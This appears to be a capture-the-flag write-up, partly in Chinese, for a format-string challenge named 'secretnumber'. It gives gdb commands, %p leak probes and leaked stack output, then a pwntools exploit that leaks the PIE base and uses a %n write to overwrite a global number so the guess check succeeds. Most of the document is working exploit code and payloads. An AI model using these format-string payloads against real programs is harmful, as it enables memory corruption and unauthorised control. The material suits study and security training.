```
set {unsigned long long}0x7fffffffe180 = 0x000000000000404C

AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p

第八个参数位置为buf所在处

p64(0x000000000000404C)+%8$n

aaaaaaaa%10$lln

AAAA0x10x10x7ffff7ec60e00x40000x7ffff7fa0a80(nil)0x1000000000x70257025414141410x70257025702570250x7025702570257025

0xa702570257025(nil)0xa1836486124cb600

AAAA%p%p%p%p%p%p%p%p%p

0x473e319500000000

%1c%10$n
```

exp: 

```
from pwn import *

context(arch='amd64',os='linux',log_level='debug')

# p=remote("node4.buuoj.cn",29092)
p = process('/home/kali/Desktop/secretnumber')

num_addr = 0x404c

#leak pie
p.sendlineafter(b"(0/1)\n",b'1')
payload = "aaaaaaaa%17$p".encode("utf-8")
p.sendlineafter(b"What's it\n",payload)
p.recvuntil(b'aaaaaaaa')

main_addr=int(p.recvuntil(b'f5')[-12:],16)
pie=main_addr-0x12F5
num_addr += pie

p.sendlineafter(b"(0/1)\n",b'1')
mypayload = b'%1c%9$na'+p64(num_addr)
p.sendlineafter(b"What's it\n",mypayload)

p.sendlineafter(b"(0/1)\n",b'0')
p.sendlineafter(b"Guess the number\n",b'1')

p.interactive()
```

#### 注意点

1. payload之间不能覆盖，就是要将修改内存的payload和将要修改的地址放在不同的内存处
2. main函数在开始时，rsp-0x18处默认存放main函数的地址，可以利用此特点泄露程序装载基址
